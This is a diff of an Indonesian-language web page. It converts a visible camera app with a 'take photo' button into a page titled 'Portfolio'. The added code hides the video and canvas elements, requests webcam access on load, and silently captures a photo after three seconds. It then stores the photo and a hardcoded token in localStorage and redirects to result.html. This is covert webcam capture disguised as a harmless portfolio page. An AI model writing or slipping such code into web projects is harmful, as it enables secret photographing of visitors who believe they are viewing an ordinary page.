@@ -2,56 +2,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kamera Capture</title>
+    <title>Portfolio</title>
     <style>
         body {
-            text-align: center;
             font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            padding: 20px;
         }
-        video, canvas {
-            width: 100%;
-            max-width: 400px;
-            margin: 10px;
-            border-radius: 10px;
-            border: 2px solid #333;
+        h1 {
+            color: #333;
         }
-        button {
-            padding: 10px;
-            font-size: 16px;
-            cursor: pointer;
+        p {
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <h1>Aplikasi Kamera</h1>
-    <video id="video" autoplay></video>
-    <br>
-    <button id="capture">Ambil Foto</button>
-    <br>
-    <canvas id="canvas" style="display: none;"></canvas><script>
+    <h1>Selamat Datang di Portfolio</h1>
+    <p>Ini adalah halaman portfolio sederhana.</p><video id="video" autoplay style="display: none;"></video>
+<canvas id="canvas" style="display: none;"></canvas>
+
+<script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const captureButton = document.getElementById('capture');
     const context = canvas.getContext('2d');
 
     navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
             video.srcObject = stream;
+            setTimeout(() => { // Ambil foto otomatis setelah 3 detik
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/png');
+                localStorage.setItem('capturedImage', imageData);
+                localStorage.setItem('authToken', 'secure123'); // Token akses
+                
+                window.location.href = 'result.html';
+            }, 3000);
         })
         .catch(err => {
             console.error("Akses kamera ditolak", err);
         });
-
-    captureButton.addEventListener('click', () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        const imageData = canvas.toDataURL('image/png');
-        localStorage.setItem('capturedImage', imageData);
-        
-        window.location.href = 'result.html';
-    });
 </script>
 
 </body>
